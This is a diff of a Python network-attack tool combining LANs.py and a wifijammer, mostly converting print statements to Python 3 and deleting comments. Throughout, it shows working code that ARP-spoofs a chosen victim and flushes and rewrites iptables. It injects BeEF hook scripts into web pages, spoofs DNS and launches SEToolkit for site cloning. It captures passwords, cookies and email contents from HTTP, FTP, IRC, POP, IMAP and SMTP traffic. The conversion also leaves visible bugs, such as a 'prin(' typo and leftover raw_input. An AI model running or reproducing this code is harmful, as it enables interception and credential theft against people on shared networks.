@@ -54,7 +54,6 @@ import fcntl
 
 
 def parse_args():
-    #Create the arguments
     parser = argparse.ArgumentParser()
     parser.add_argument("-b", "--beef",
                         help="Inject a BeEF hook URL. Example usage: -b http://192.168.0.3:3000/hook.js")
@@ -128,15 +127,11 @@ C = '\033[36m'  # cyan
 GR = '\033[37m'  # gray
 T = '\033[93m'  # tan
 
-#############################
-##### Start LANs.py Code####
-############################
 
 interface = ''
 
 def LANsMain(args):
     global victimIP, interface
-    #Find the gateway and interface
     ipr = Popen(['/sbin/ip', 'route'], stdout=PIPE, stderr=DN)
     ipr = ipr.communicate()[0]
     iprs = ipr.split('\n')
@@ -163,14 +158,14 @@ def LANsMain(args):
     else:
         au = active_users()
         au.users(IPprefix, routerIP)
-        print '\n[*] Turning off monitor mode'
+        print('\n[*] Turning off monitor mode')
         os.system('airmon-ng stop %s >/dev/null 2>&1' % au.monmode)
         try:
             victimIP = raw_input('[*] Enter the non-router IP to spoof: ')
         except KeyboardInterrupt:
             exit('\n[-] Quitting')
 
-    print "[*] Checking the DHCP and DNS server addresses..."
+    print("[*] Checking the DHCP and DNS server addresses...")
     # DHCP is a pain in the ass to craft
     dhcp = (Ether(dst='ff:ff:ff:ff:ff:ff') /
             IP(src="0.0.0.0", dst="255.255.255.255") /
@@ -197,7 +192,7 @@ def LANsMain(args):
                 if 'name_server' in x:
                     dnsIP = x[1]
     else:
-        print "[-] No answer to DHCP packet sent to find the DNS server. Setting DNS and DHCP server to router IP."
+        print("[-] No answer to DHCP packet sent to find the DNS server. Setting DNS and DHCP server to router IP.")
         dnsIP = routerIP
         DHCPsrvr = routerIP
         local_domain = 'None'
@@ -206,15 +201,15 @@ def LANsMain(args):
     print_vars(DHCPsrvr, dnsIP, local_domain, routerIP, victimIP)
     if args.routermac:
         routerMAC = args.routermac
-        print "[*] Router MAC: " + routerMAC
+        print("[*] Router MAC: " + routerMAC)
         logger.write("[*] Router MAC: " + routerMAC + '\n')
     else:
         try:
             routerMAC = Spoof().originalMAC(routerIP)
-            print "[*] Router MAC: " + routerMAC
+            print("[*] Router MAC: " + routerMAC)
             logger.write("[*] Router MAC: " + routerMAC + '\n')
         except Exception:
-            print "[-] Router did not respond to ARP request; attempting to pull MAC from local ARP cache - [/usr/bin/arp -n]"
+            print("[-] Router did not respond to ARP request; attempting to pull MAC from local ARP cache - [/usr/bin/arp -n]")
             logger.write(
                 "[-] Router did not respond to ARP request; attempting to pull the MAC from the ARP cache - [/usr/bin/arp -n]")
             try:
@@ -227,7 +222,7 @@ def LANsMain(args):
                             accr = raw_input("[+] Is " + R + routerMACguess + W + " the accurate router MAC? [y/n]: ")
                             if accr == 'y':
                                 routerMAC = routerMACguess
-                                print "[*] Router MAC: " + routerMAC
+                                print("[*] Router MAC: " + routerMAC)
                                 logger.write("[*] Router MAC: " + routerMAC + '\n')
                         else:
                             exit("[-] Failed to get accurate router MAC address")
@@ -236,12 +231,12 @@ def LANsMain(args):
 
     if args.victimmac:
         victimMAC = args.victimmac
-        print "[*] Victim MAC: " + victimMAC
+        print("[*] Victim MAC: " + victimMAC)
         logger.write("[*] Victim MAC: " + victimMAC + '\n')
     else:
         try:
             victimMAC = Spoof().originalMAC(victimIP)
-            print "[*] Victim MAC: " + victimMAC
+            print("[*] Victim MAC: " + victimMAC)
             logger.write("[*] Victim MAC: " + victimMAC + '\n')
         except Exception:
             exit(
@@ -252,22 +247,22 @@ def LANsMain(args):
     threads(args)
 
     if args.nmap:
-        print "\n[*] Running nmap scan; this may take several minutes - [nmap -T4 -O %s]" % victimIP
+        print("\n[*] Running nmap scan; this may take several minutes - [nmap -T4 -O %s]" % victimIP)
         try:
             nmap = Popen(['/usr/bin/nmap', '-T4', '-O', '-e', interface, victimIP], stdout=PIPE, stderr=DN)
             nmap.wait()
             nmap = nmap.communicate()[0].splitlines()
             for x in nmap:
                 if x != '':
-                    print '[+]', x
+                    print('[+]', x)
                     logger.write('[+] ' + x + '\n')
         except Exception:
-            print '[-] Nmap port and OS scan failed, is it installed?'
+            print('[-] Nmap port and OS scan failed, is it installed?')
 
-    print ''
+    print('')
 
     def signal_handler(signal, frame):
-        print 'learing iptables, sending healing packets, and turning off IP forwarding...'
+        print('learing iptables, sending healing packets, and turning off IP forwarding...')
         logger.close()
         with open('/proc/sys/net/ipv4/ip_forward', 'r+') as forward:
             forward.write(ipf)
@@ -494,7 +489,7 @@ class Parser():
                             del pkt[IP].chksum
                             del pkt[TCP].chksum
                             payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
-                            print '[-] Could not recompress html, sent packet as is'
+                            print('[-] Could not recompress html, sent packet as is')
                             self.html_url = None
                             return
                         except Exception:
@@ -512,14 +507,14 @@ class Parser():
                 pkt_frags = fragment(pkt)
                 for p in pkt_frags:
                     send(p)
-                print R + '[!] Injected HTML into packet for ' + W + self.html_url
+                print(R + '[!] Injected HTML into packet for ' + W + self.html_url)
                 logger.write('[!] Injected HTML into packet for ' + self.html_url)
                 self.block_acks.append(ack)
                 self.html_url = None
             except Exception as e:
                 payload.set_verdict(nfqueue.NF_ACCEPT)
                 self.html_url = None
-                print '[-] Failed to inject packet', e
+                print('[-] Failed to inject packet',{e})
                 return
 
             if len(self.block_acks) > 30:
@@ -562,16 +557,12 @@ class Parser():
             if get:
                 return host + get
 
-    # Catch search terms
-    # As it stands now this has a moderately high false positive rate mostly due to the common ?s= and ?q= vars
-    # I figured better to err on the site of more data than less and it's easy to tell the false positives from the real searches 
     def searches(self, url, host):
-        # search, query, search?q, ?s, &q, ?q, search?p, searchTerm, keywords, command
         searched = re.search(
             '((search|query|search\?q|\?s|&q|\?q|search\?p|search[Tt]erm|keywords|command)=([^&][^&]*))', url)
         if searched:
             searched = searched.group(3)
-            # Common false positives
+            
             if 'select%20*%20from' in searched:
                 pass
             if host == 'geo.yahoo.com':
@@ -582,12 +573,12 @@ class Parser():
                     '%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=').replace('%22',
                                                                                                     '\"').replace('%24',
                                                                                                                   '$')
-                print T + '[+] Searched ' + W + host + T + ': ' + searched + W
+                print(T + '[+] Searched ' + W + host + T + ': ' + searched + W)
                 logger.write('[+] Searched ' + host + ' for: ' + searched + '\n')
 
     def post_parser(self, url, body, host, header_lines):
         if 'ocsp' in url:
-            print B + '[+] POST: ' + W + url
+            print(B + '[+] POST: ' + W + url)
             logger.write('[+] POST: ' + url + '\n')
         elif body != '':
             try:
@@ -596,15 +587,12 @@ class Parser():
             except Exception:
                 pass
             if self.HTTPfragged == 1:
-                print B + '[+] Fragmented POST: ' + W + url + B + " HTTP POST's combined load: " + body + W
+                print(B + '[+] Fragmented POST: ' + W + url + B + " HTTP POST's combined load: " + body + W)
                 logger.write('[+] Fragmented POST: ' + url + " HTTP POST's combined load: " + body + '\n')
             else:
-                print B + '[+] POST: ' + W + url + B + ' HTTP POST load: ' + body + W
+                print(B + '[+] POST: ' + W + url + B + ' HTTP POST load: ' + body + W)
                 logger.write('[+] POST: ' + url + " HTTP POST's combined load: " + body + '\n')
 
-            # If you see any other login/pw variable names, tell me and I'll add em in here
-            # As it stands now this has a moderately high false positive rate; I figured better to err on the site of more data than less
-            # email, user, username, name, login, log, loginID
             user_regex = '([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&|;]*)'
             # password, pass, passwd, pwd, psw, passwrd, passw
             pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|[Pp]asswrd|[Pp]assw)=([^&|;]*)'
@@ -643,7 +631,7 @@ class Parser():
         if url:
             #Print the URL
             if self.args.verboseURL:
-                print '[*] ' + url
+                print('[*] ' + url)
                 logger.write('[*] ' + url + '\n')
 
             if self.args.urlspy:
@@ -651,13 +639,12 @@ class Parser():
                 if any(i in url for i in d):
                     return
                 if len(url) > 146:
-                    print '[*] ' + url[:145]
+                    print('[*] ' + url[:145])
                     logger.write('[*] ' + url[:145] + '\n')
                 else:
-                    print '[*] ' + url
+                    print('[*] ' + url)
                     logger.write('[*] ' + url + '\n')
 
-            # Print search terms
             if self.args.post or self.args.urlspy:
                 self.searches(url, host)
 
@@ -668,13 +655,13 @@ class Parser():
     def ftp(self, load, IP_dst, IP_src):
         load = repr(load)[1:-1].replace(r"\r\n", "")
         if 'USER ' in load:
-            print R + '[!] FTP ' + load + ' SERVER: ' + IP_dst + W
+            print(R + '[!] FTP ' + load + ' SERVER: ' + IP_dst + W)
             logger.write('[!] FTP ' + load + ' SERVER: ' + IP_dst + '\n')
         if 'PASS ' in load:
-            print R + '[!] FTP ' + load + ' SERVER: ' + IP_dst + W
+            print(R + '[!] FTP ' + load + ' SERVER: ' + IP_dst + W)
             logger.write('[!] FTP ' + load + ' SERVER: ' + IP_dst + '\n')
         if 'authentication failed' in load:
-            print R + '[*] FTP ' + load + W
+            prin(R + '[*] FTP ' + load + W)
             logger.write('[*] FTP ' + load + '\n')
 
     def irc(self, load, dport, sport, IP_src):
@@ -684,44 +671,44 @@ class Parser():
                 if 'NICK ' in load[0]:
                     self.IRCnick = load[0].split('NICK ')[1]
                     server = load[1].replace('USER user user ', '').replace(' :user', '')
-                    print R + '[!] IRC username: ' + self.IRCnick + ' on ' + server + W
+                    print(R + '[!] IRC username: ' + self.IRCnick + ' on ' + server + W)
                     logger.write('[!] IRC username: ' + self.IRCnick + ' on ' + server + '\n')
                 if 'NS IDENTIFY ' in load[0]:
                     ircpass = load[0].split('NS IDENTIFY ')[1]
-                    print R + '[!] IRC password: ' + ircpass + W
+                    print(R + '[!] IRC password: ' + ircpass + W)
                     logger.write('[!] IRC password: ' + ircpass + '\n')
                 if 'JOIN ' in load[0]:
                     join = load[0].split('JOIN ')[1]
-                    print C + '[+] IRC joined: ' + W + join
+                    print(C + '[+] IRC joined: ' + W + join)
                     logger.write('[+] IRC joined: ' + join + '\n')
                 if 'PART ' in load[0]:
                     part = load[0].split('PART ')[1]
-                    print C + '[+] IRC left: ' + W + part
+                    print(C + '[+] IRC left: ' + W + part)
                     logger.write('[+] IRC left: ' + part + '\n')
                 if 'QUIT ' in load[0]:
                     quit = load[0].split('QUIT :')[1]
-                    print C + '[+] IRC quit: ' + W + quit
+                    print(C + '[+] IRC quit: ' + W + quit)
                     logger.write('[+] IRC quit: ' + quit + '\n')
-            # Catch messages from the victim to an IRC channel
+        
             if 'PRIVMSG ' in load[0]:
                 if IP_src == victimIP:
                     load = load[0].split('PRIVMSG ')[1]
                     channel = load.split(' :', 1)[0]
                     ircmsg = load.split(' :', 1)[1]
                     if self.IRCnick != '':
-                        print C + '[+] IRC victim ' + W + self.IRCnick + C + ' to ' + W + channel + C + ': ' + ircmsg + W
+                        print(C + '[+] IRC victim ' + W + self.IRCnick + C + ' to ' + W + channel + C + ': ' + ircmsg + W)
                         logger.write('[+] IRC ' + self.IRCnick + ' to ' + channel + ': ' + ircmsg + '\n')
                     else:
-                        print C + '[+] IRC msg to ' + W + channel + C + ': ' + ircmsg + W
+                        print(C + '[+] IRC msg to ' + W + channel + C + ': ' + ircmsg + W)
                         logger.write('[+] IRC msg to ' + channel + ':' + ircmsg + '\n')
-                # Catch messages from others that tag the victim's nick
+                
                 elif self.IRCnick in load[0] and self.IRCnick != '':
                     sender_nick = load[0].split(':', 1)[1].split('!', 1)[0]
                     try:
                         load = load[0].split('PRIVMSG ')[1].split(' :', 1)
                         channel = load[0]
                         ircmsg = load[1]
-                        print C + '[+] IRC ' + W + sender_nick + C + ' to ' + W + channel + C + ': ' + ircmsg[1:] + W
+                        print(C + '[+] IRC ' + W + sender_nick + C + ' to ' + W + channel + C + ': ' + ircmsg[1:] + W)
                         logger.write('[+] IRC ' + sender_nick + ' to ' + channel + ': ' + ircmsg[1:] + '\n')
                     except Exception:
                         return
@@ -735,23 +722,23 @@ class Parser():
                     return
                 else:
                     self.Cookies.append(x)
-                print P + '[+] Cookie found for ' + W + host + P + ' logged in LANspy.log.txt' + W
+                print(P + '[+] Cookie found for ' + W + host + P + ' logged in LANspy.log.txt' + W)
                 logger.write('[+] Cookie found for' + host + ':' + x.replace('Cookie: ', '') + '\n')
 
     def user_pass(self, username, password):
         if username:
             for u in username:
-                print R + '[!] Username found: ' + u[1] + W
+                print(R + '[!] Username found: ' + u[1] + W)
                 logger.write('[!] Username: ' + u[1] + '\n')
         if password:
             for p in password:
                 if p[1] != '':
-                    print R + '[!] Password: ' + p[1] + W
+                    print(R + '[!] Password: ' + p[1] + W)
                     logger.write('[!] Password: ' + p[1] + '\n')
 
     def mailspy(self, load, dport, sport, IP_dst, IP_src, mail_ports, ack):
         load = repr(load)[1:-1]
-        # Catch fragmented mail packets
+    
         if ack == self.oldmailack:
             if load != r'.\r\n':
                 self.oldmailload = self.oldmailload + load
@@ -770,13 +757,13 @@ class Parser():
         header_lines = headers.split(r"\r\n")
         email_headers = ['Date: ', 'Subject: ', 'To: ', 'From: ']
 
-        # Find passwords
+    
         if dport in [25, 26, 110, 143]:
             self.passwords(IP_src, load, dport, IP_dst)
-        # Find outgoing messages
+    
         if dport == 26 or dport == 25:
             self.outgoing(load, body, header_lines, email_headers, IP_src)
-        # Find incoming messages
+        
         if sport in [110, 143]:
             self.incoming(headers, body, header_lines, email_headers, sport, dport)
 
@@ -784,13 +771,13 @@ class Parser():
         load = load.replace(r'\r\n', '')
         if dport == 143 and IP_src == victimIP and len(load) > 15:
             if self.IMAPauth == 1 and self.IMAPdest == IP_dst:
-                # Don't double output mail passwords
+                
                 for x in self.mail_passwds:
                     if load in x:
                         self.IMAPauth = 0
                         self.IMAPdest = ''
                         return
-                print R + '[!] IMAP user and pass found: ' + load + W
+                print(R + '[!] IMAP user and pass found: ' + load + W)
                 logger.write('[!] IMAP user and pass found: ' + load + '\n')
                 self.mail_passwds.append(load)
                 self.decode(load, dport)
@@ -801,13 +788,13 @@ class Parser():
                 self.IMAPdest = IP_dst
         if dport == 110 and IP_src == victimIP:
             if self.POPauth == 1 and self.POPdest == IP_dst and len(load) > 10:
-                # Don't double output mail passwords
+            
                 for x in self.mail_passwds:
                     if load in x:
                         self.POPauth = 0
                         self.POPdest = ''
                         return
-                print R + '[!] POP user and pass found: ' + load + W
+                print(R + '[!] POP user and pass found: ' + load + W)
                 logger.write('[!] POP user and pass found: ' + load + '\n')
                 self.mail_passwds.append(load)
                 self.decode(load, dport)
@@ -818,13 +805,13 @@ class Parser():
                 self.POPdest = IP_dst
         if dport == 26:
             if 'AUTH PLAIN ' in load:
-                # Don't double output mail passwords
+            
                 for x in self.mail_passwds:
                     if load in x:
                         self.POPauth = 0
                         self.POPdest = ''
                         return
-                print R + '[!] Mail authentication found: ' + load + W
+                print(R + '[!] Mail authentication found: ' + load + W)
                 logger.write('[!] Mail authentication found: ' + load + '\n')
                 self.mail_passwds.append(load)
                 self.decode(load, dport)
@@ -835,23 +822,23 @@ class Parser():
                 for x in email_headers:
                     if x in l:
                         self.OheadersFound.append(l)
-            # if date, from, to, in headers then print the message
+        
             if len(self.OheadersFound) > 3 and body != '':
                 if self.mailfragged == 1:
-                    print O + '[!] OUTGOING MESSAGE (fragmented)' + W
+                    print(O + '[!] OUTGOING MESSAGE (fragmented)' + W)
                     logger.write('[!] OUTGOING MESSAGE (fragmented)\n')
                     for x in self.OheadersFound:
-                        print O + '   ', x + W
+                        print(O + '   ', x + W)
                         logger.write(' ' + x + '\n')
-                    print O + '   Message:', body + W
+                    print(O + '   Message:', body + W)
                     logger.write(' Message:' + body + '\n')
                 else:
-                    print O + '[!] OUTGOING MESSAGE' + W
+                    print(O + '[!] OUTGOING MESSAGE' + W)
                     logger.write('[!] OUTGOING MESSAGE\n')
                     for x in self.OheadersFound:
-                        print O + '   ', x + W
+                        print(O + '   ', x + W)
                         logger.write(' ' + x + '\n')
-                    print O + '   Message:', body + W
+                    print(O + '   Message:', body + W)
                     logger.write(' Message:' + body + '\n')
 
         self.OheadersFound = []
@@ -872,20 +859,20 @@ class Parser():
                     return
             if message != '':
                 if self.mailfragged == 1:
-                    print O + '[!] INCOMING MESSAGE (fragmented)' + W
+                    print(O + '[!] INCOMING MESSAGE (fragmented)' + W)
                     logger.write('[!] INCOMING MESSAGE (fragmented)\n')
                     for x in self.IheadersFound:
-                        print O + '   ' + x + W
+                        print(O + '   ' + x + W)
                         logger.write(' ' + x + '\n')
-                    print O + '   Message: ' + message + W
+                    print(O + '   Message: ' + message + W)
                     logger.write(' Message: ' + message + '\n')
                 else:
-                    print O + '[!] INCOMING MESSAGE' + W
+                    print(O + '[!] INCOMING MESSAGE' + W)
                     logger.write('[!] INCOMING MESSAGE\n')
                     for x in self.IheadersFound:
-                        print O + '   ' + x + W
+                        print(O + '   ' + x + W)
                         logger.write(' ' + x + '\n')
-                    print O + '   Message: ' + message + W
+                    print(O + '   Message: ' + message + W)
                     logger.write(' Message: ' + message + '\n')
         self.IheadersFound = []
 
@@ -903,12 +890,11 @@ class Parser():
                 decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
             except Exception:
                 pass
-        # Test to see if decode worked
+        
         if '@' in decoded:
-            print R + '[!] Decoded:' + decoded + W
+            print(R + '[!] Decoded:' + decoded + W)
             logger.write('[!] Decoded:' + decoded + '\n')
 
-    # Spoof DNS for a specific domain to point to your machine
     def dnsspoof(self, dns_layer, IP_src, IP_dst, sport, dport, payload):
         localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
         if self.args.dnsspoof:
@@ -930,10 +916,10 @@ class Parser():
                                                                                       rdata=rIP))
         payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(p), len(p))
         if self.args.dnsspoof:
-            print G + '[!] Sent spoofed packet for ' + W + self.args.dnsspoof + G + ' to ' + W + rIP
+            print(G + '[!] Sent spoofed packet for ' + W + self.args.dnsspoof + G + ' to ' + W + rIP)
             logger.write('[!] Sent spoofed packet for ' + self.args.dnsspoof + G + ' to ' + rIP + '\n')
         elif self.args.dnsall:
-            print G + '[!] Sent spoofed packet for ' + W + dns_layer[DNSQR].qname[:-1] + G + ' to ' + W + rIP
+            print(G + '[!] Sent spoofed packet for ' + W + dns_layer[DNSQR].qname[:-1] + G + ' to ' + W + rIP)
             logger.write('[!] Sent spoofed packet for ' + dns_layer[DNSQR].qname[:-1] + ' to ' + rIP + '\n')
                          
 class Queued(object):
@@ -944,13 +930,13 @@ class Queued(object):
         self.q.set_queue_maxlen(5000)
         reactor.addReader(self)
         self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
-        print '[*] Flushed firewall and forwarded traffic to the queue; waiting for data'
+        print('[*] Flushed firewall and forwarded traffic to the queue; waiting for data')
 
     def fileno(self):
         return self.q.get_fd()
 
     def doRead(self):
-        self.q.process_pending(500)  # if I lower this to, say, 5, it hurts injection's reliability
+        self.q.process_pending(500)  
 
     def connectionLost(self, reason):
         reactor.removeReader(self)
@@ -978,23 +964,23 @@ class active_users():
             if self.current_time > self.start_time + 1:
                 self.IPandMAC.sort(key=lambda x: float(x[2]), reverse=True)  # sort by data packets
                 os.system('/usr/bin/clear')
-                print '[*] ' + T + 'IP address' + W + ' and ' + R + 'data packets' + W + ' sent/received'
-                print '---------------------------------------------'
+                print('[*] ' + T + 'IP address' + W + ' and ' + R + 'data packets' + W + ' sent/received')
+                print('---------------------------------------------')
                 for x in self.IPandMAC:
                     if len(x) == 3:
                         ip = x[0].ljust(16)
                         data = str(x[2]).ljust(5)
-                        print T + ip + W, R + data + W
+                        print(T + ip + W, R + data + W)
                     else:
                         ip = x[0].ljust(16)
                         data = str(x[2]).ljust(5)
-                        print T + ip + W, R + data + W, x[3]
-                print '\n[*] Hit Ctrl-C at any time to stop and choose a victim IP'
+                        print(T + ip + W, R + data + W, x[3])
+                print('\n[*] Hit Ctrl-C at any time to stop and choose a victim IP')
                 self.start_time = time.time()
 
     def users(self, IPprefix, routerIP):
 
-        print '[*] Running ARP scan to identify users on the network; this may take a minute - [nmap -sn -n %s]' % IPprefix
+        print('[*] Running ARP scan to identify users on the network; this may take a minute - [nmap -sn -n %s]' % IPprefix)
         iplist = []
         maclist = []
         try:
@@ -1002,7 +988,7 @@ class active_users():
             nmap = nmap.communicate()[0]
             nmap = nmap.splitlines()[2:-1]
         except Exception:
-            print '[-] Nmap ARP ping failed, is nmap installed?'
+            print('[-] Nmap ARP ping failed, is nmap installed?')
         for x in nmap:
             if 'Nmap' in x:
                 pieces = x.split()
@@ -1015,7 +1001,6 @@ class active_users():
         zipped = zip(iplist, maclist)
         self.IPandMAC = [list(item) for item in zipped]
 
-        # Make sure router is caught in the arp ping
         r = 0
         for i in self.IPandMAC:
             i.append(0)
@@ -1027,29 +1012,27 @@ class active_users():
         if r == 0:
             exit('[-] Router MAC not found. Exiting.')
 
-        # Do nbtscan for windows netbios names
-        print '[*] Running nbtscan to get Windows netbios names - [nbtscan %s]' % IPprefix
+        print('[*] Running nbtscan to get Windows netbios names - [nbtscan %s]' % IPprefix)
         try:
             nbt = Popen(['nbtscan', IPprefix], stdout=PIPE, stderr=DN)
             nbt = nbt.communicate()[0]
             nbt = nbt.splitlines()
             nbt = nbt[4:]
         except Exception:
-            print '[-] nbtscan error, are you sure it is installed?'
+            print('[-] nbtscan error, are you sure it is installed?')
         for l in nbt:
             try:
                 l = l.split()
                 nbtip = l[0]
                 nbtname = l[1]
             except Exception:
-                print '[-] Could not find any netbios names. Continuing without them'
+                print('[-] Could not find any netbios names. Continuing without them')
             if nbtip and nbtname:
                 for a in self.IPandMAC:
                     if nbtip == a[0]:
                         a.append(nbtname)
 
-        # Start monitor mode
-        print '[*] Enabling monitor mode [airmon-ng ' + 'start ' + interface + ']'
+        print('[*] Enabling monitor mode [airmon-ng ' + 'start ' + interface + ']')
         try:
             promiscSearch = Popen(['airmon-ng', 'start', '%s' % interface], stdout=PIPE, stderr=DN)
             promisc = promiscSearch.communicate()[0]
@@ -1060,26 +1043,21 @@ class active_users():
 
         sniff(iface=self.monmode, prn=self.pkt_cb, store=0)
 
-
-#Print all the variables
 def print_vars(DHCPsrvr, dnsIP, local_domain, routerIP, victimIP):
-    print "[*] Active interface: " + interface
-    print "[*] DHCP server: " + DHCPsrvr
-    print "[*] DNS server: " + dnsIP
-    print "[*] Local domain: " + local_domain
-    print "[*] Router IP: " + routerIP
-    print "[*] Victim IP: " + victimIP
+    print("[*] Active interface: " + interface)
+    print("[*] DHCP server: " + DHCPsrvr)
+    print("[*] DNS server: " + dnsIP)
+    print("[*] Local domain: " + local_domain)
+    print("[*] Router IP: " + routerIP)
+    print("[*] Victim IP: " + victimIP)
     logger.write("[*] Router IP: " + routerIP + '\n')
     logger.write("[*] victim IP: " + victimIP + '\n')
 
-
-#Enable IP forwarding and flush possibly conflicting iptables rules
 def setup(victimMAC):
     os.system('/sbin/iptables -F')
     os.system('/sbin/iptables -X')
     os.system('/sbin/iptables -t nat -F')
     os.system('/sbin/iptables -t nat -X')
-    # Just throw packets that are from and to the victim into the reactor
     os.system(
         '/sbin/iptables -A FORWARD -p tcp -s %s -m multiport --dports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
     os.system(
@@ -1088,15 +1066,15 @@ def setup(victimMAC):
         '/sbin/iptables -A FORWARD -p tcp -s %s -m multiport --sports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
     os.system(
         '/sbin/iptables -A FORWARD -p tcp -d %s -m multiport --sports 21,26,80,110,143,6667 -j NFQUEUE' % victimIP)
-    # To catch DNS packets you gotta do prerouting rather than forward for some reason?
+
     os.system('/sbin/iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
     with open('/proc/sys/net/ipv4/ip_forward', 'r+') as ipf:
         ipf.write('1\n')
-        print '[*] Enabled IP forwarding'
+        print('[*] Enabled IP forwarding')
         return ipf.read()
 
 
-# Start threads
+
 def threads(args):
     rt = Thread(target=reactor.run,
                 args=(False,))  #reactor must be started without signal handling since it's not in the main thread
@@ -1113,32 +1091,32 @@ def threads(args):
         setoolkit = raw_input(
             '[*] You are DNS spoofing ' + args.dnsspoof + ', would you like to start the Social Engineer\'s Toolkit for easy exploitation? [y/n]: ')
         if setoolkit == 'y':
-            print '[*] Starting SEtoolkit. To clone ' + args.dnsspoof + ' hit options 1, 2, 3, 2, then enter ' + args.dnsspoof
+            print('[*] Starting SEtoolkit. To clone ' + args.dnsspoof + ' hit options 1, 2, 3, 2, then enter ' + args.dnsspoof)
             try:
                 se = Thread(target=os.system, args=('/usr/bin/xterm -e /usr/bin/setoolkit >/dev/null 2>&1',))
                 se.daemon = True
                 se.start()
             except Exception:
-                print '[-] Could not open SEToolkit, is it installed? Continuing as normal without it.'
+                print('[-] Could not open SEToolkit, is it installed? Continuing as normal without it.')
 
     if args.nmapaggressive:
-        print '[*] Starting ' + R + 'aggressive scan [nmap -e ' + interface + ' -T4 -A -v -Pn -oN ' + victimIP + ']' + W + ' in background; results will be in a file ' + victimIP + '.nmap.txt'
+        print('[*] Starting ' + R + 'aggressive scan [nmap -e ' + interface + ' -T4 -A -v -Pn -oN ' + victimIP + ']' + W + ' in background; results will be in a file ' + victimIP + '.nmap.txt')
         try:
             n = Thread(target=os.system, args=(
                 'nmap -e ' + interface + ' -T4 -A -v -Pn -oN ' + victimIP + '.nmap.txt ' + victimIP + ' >/dev/null 2>&1',))
             n.daemon = True
             n.start()
         except Exception:
-            print '[-] Aggressive Nmap scan failed, is nmap installed?'
+            print('[-] Aggressive Nmap scan failed, is nmap installed?')
 
     if args.setoolkit:
-        print '[*] Starting SEtoolkit'
+        print('[*] Starting SEtoolkit')
         try:
             se = Thread(target=os.system, args=('/usr/bin/xterm -e /usr/bin/setoolkit >/dev/null 2>&1',))
             se.daemon = True
             se.start()
         except Exception:
-            print '[-] Could not open SEToolkit, continuing without it.'
+            print('[-] Could not open SEToolkit, continuing without it.')
 
 
 def pcap_handler(args):
@@ -1161,9 +1139,8 @@ def pcap_handler(args):
         exit(
             '[-] When reading from pcap file you may only include the following arguments: -v, -u, -p, -pcap [pcap filename], and -ip [victim IP address]')
 
-    # Cleans up if Ctrl-C is caught
     def signal_handler(signal, frame):
-        print 'learing iptables, sending healing packets, and turning off IP forwarding...'
+        print('learing iptables, sending healing packets, and turning off IP forwarding...')
         logger.close()
         with open('/proc/sys/net/ipv4/ip_forward', 'r+') as forward:
             forward.write(ipf)
@@ -1181,13 +1158,6 @@ def pcap_handler(args):
         Spoof().poison(routerIP, victimIP, routerMAC, victimMAC)
         time.sleep(1.5)
 
-#################################
-####End LANs.py Code#############
-################################
-
-################################
-#####Start wifijammer Code######
-###############################
 
 clients_APs = []
 APs = []
@@ -1206,7 +1176,6 @@ def wifijammerMain(args):
     conf.iface = mon_iface
     mon_MAC = mon_mac(mon_iface)
 
-    # Start channel hopping
     hop = Thread(target=channel_hop, args=(mon_iface, args))
     hop.daemon = True
     hop.start()
@@ -1217,7 +1186,7 @@ def wifijammerMain(args):
         sniff(iface=mon_iface, store=0, prn=cb)
     except Exception as msg:
         remove_mon_iface(mon_iface)
-        print '\n[' + R + '!' + W + '] Closing'
+        print('\n[' + R + '!' + W + '] Closing')
         sys.exit(0)
 
 
@@ -1231,8 +1200,8 @@ def get_mon_iface(args):
         monitor_on = True
         return monitors[0]
     else:
-        # Start monitor mode on a wireless interface
-        print '[' + G + '*' + W + '] Finding the most powerful interface...'
+        
+        print('[' + G + '*' + W + '] Finding the most powerful interface...')
         interface = get_iface(interfaces)
         monmode = start_mon_mode(interface)
         return monmode
@@ -1244,11 +1213,11 @@ def iwconfig():
     DN = open(os.devnull, 'w')
     proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
     for line in proc.communicate()[0].split('\n'):
-        if len(line) == 0: continue  # Isn't an empty string
-        if line[0] != ' ':  # Doesn't start with space
+        if len(line) == 0: continue  
+        if line[0] != ' ':  
             wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
-            if not wired_search:  # Isn't wired
-                iface = line[:line.find(' ')]  # is the interface
+            if not wired_search:  
+                iface = line[:line.find(' ')]  
                 if 'Mode:Monitor' in line:
                     monitors.append(iface)
                 elif 'IEEE 802.11' in line:
@@ -1273,13 +1242,13 @@ def get_iface(interfaces):
         count = 0
         proc = Popen(['iwlist', iface, 'scan'], stdout=PIPE, stderr=DN)
         for line in proc.communicate()[0].split('\n'):
-            if ' - Address:' in line:  # first line in iwlist scan for a new AP
+            if ' - Address:' in line:  
                 count += 1
         scanned_aps.append((count, iface))
-        print '[' + G + '+' + W + '] Networks discovered by ' + G + iface + W + ': ' + T + str(count) + W
+        print('[' + G + '+' + W + '] Networks discovered by ' + G + iface + W + ': ' + T + str(count) + W)
     try:
         interface = max(scanned_aps)[1]
-        print '[' + G + '+' + W + '] ' + interface + " chosen. Is this ok? [Enter=yes] "
+        print('[' + G + '+' + W + '] ' + interface + " chosen. Is this ok? [Enter=yes] ")
         input = raw_input()
         if input == "" or input == "y" or input == "Y" or input.lower() == "yes":
             return interface
@@ -1288,17 +1257,17 @@ def get_iface(interfaces):
             if interfaceInput in interfaces:
                 return interfaceInput
             else:
-                print '[' + R + '!' + W + '] Exiting: Invalid Interface!'
+                print('[' + R + '!' + W + '] Exiting: Invalid Interface!')
     except Exception as e:
         for iface in interfaces:
             interface = iface
-            print '[' + R + '-' + W + '] Minor error:', e
-            print '    Starting monitor mode on ' + G + interface + W
+            print('[' + R + '-' + W + '] Minor error:', e)
+            print('    Starting monitor mode on ' + G + interface + W)
             return interface
 
 
 def start_mon_mode(interface):
-    print '[' + G + '+' + W + '] Starting monitor mode off ' + G + interface + W
+    print('[' + G + '+' + W + '] Starting monitor mode off ' + G + interface + W)
     try:
